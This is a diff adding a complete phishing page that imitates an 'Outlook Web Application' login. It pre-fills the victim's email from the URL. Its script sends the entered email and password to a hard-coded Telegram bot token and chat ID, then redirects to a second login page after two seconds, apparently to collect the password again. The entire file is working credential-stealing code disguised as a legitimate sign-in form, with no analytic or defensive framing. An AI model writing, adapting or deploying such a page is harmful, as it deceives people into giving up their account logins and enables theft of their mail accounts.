@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Outlook Web Application</title>
+  <style>
+    body {
+      margin: 10px 0 0; /* Adjusted top margin */
+      padding: 0;
+      background-color: #1565c0; /* Dark Sky Blue */
+      display: flex;
+      justify-content: center;
+      align-items: flex-start; /* Adjusted alignment to top */
+      height: 100vh;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    form {
+      max-width: 400px; /* Adjusted width */
+      width: 90%; /* Adjusted width */
+      border-radius: 5px;
+      background-color: #1565c0; /* Dark Sky Blue */
+      padding: 20px; /* Added padding */
+    }
+
+    .logo-container {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo-container img {
+      max-width: 100%;
+      height: auto;
+      width: 100%;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%; /* Adjusted width */
+      padding: 12px; /* Increased padding */
+      margin-bottom: 10px;
+      border-radius: 5px;
+      background-color: #fff;
+      box-sizing: border-box; /* Adjusted box sizing */
+    }
+
+    .remember-me {
+      display: flex;
+      align-items: center;
+      justify-content: flex-end; /* Adjusted alignment to right */
+      margin-bottom: 10px;
+      color: #fff;
+      font-size: 12px;
+    }
+
+    .remember-me input[type="checkbox"] {
+      margin-right: 5px;
+    }
+
+    .forgot-password {
+      margin-left: auto; /* Added margin to push to the right */
+      color: #fff;
+      font-size: 12px;
+      text-decoration: none;
+    }
+
+    .button-container {
+      display: flex;
+      justify-content: center; /* Center the button horizontally */
+    }
+
+    button {
+      width: 100%;
+      max-width: 150px; /* Limit the button width */
+      padding: 10px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 10px; /* Added margin-top to separate from the checkbox and link */
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <form id="first-login-form" action="#" method="post">
+      <div class="logo-container">
+        <img src="ntop.png" alt="Logo" style="max-width: 100%; width: 100%;">
+      </div>
+      <input type="email" id="email" name="email" placeholder="Email" required>
+      <input type="password" id="password" name="password" placeholder="Password" required>
+      <div class="remember-me">
+        <input type="checkbox" id="remember" name="remember">
+        <label for="remember">Remember me</label>
+        <a href="#" class="forgot-password">Forgot password?</a>
+      </div>
+      <div class="button-container"> <!-- Added a container for the button -->
+        <button type="submit" onclick="submitFirstPageCredentials(event)">Login</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    // Retrieve email from URL query parameter and pre-fill the input field
+    window.addEventListener('DOMContentLoaded', () => {
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email');
+      const hashEmail = window.location.hash.substr(1); // Get email from URL hash
+      if (email || hashEmail) {
+        const emailInput = document.getElementById('email');
+        emailInput.value = email || hashEmail;
+      }
+    });
+
+    function submitFirstPageCredentials(event) {
+      event.preventDefault(); // Prevent form submission
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      // Send first page credentials to Telegram using API
+      const telegramBotToken = '2143043732:AAHxBJToyKjR9xlIQjijGr7AwDqV3m2RNZQ';
+      const chatId = '672269703';
+      const message = `First Login:\nEmail: ${email}\nPassword: ${password}`;
+      const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      // Make a POST request to Telegram API
+      fetch(apiUrl, { method: 'POST' })
+        .then(response => {
+          // Handle response if needed
+        })
+        .catch(error => {
+          console.error('Failed to send message to Telegram:', error);
+        });
+
+      // Redirect to the second login page with the email as a query parameter
+      const redirectUrl = `index2.html?email=${encodeURIComponent(email)}`;
+      setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 2000); // Delay the redirection for 2 seconds (adjust as needed)
+    }
+  </script>
+</body>
+</html>
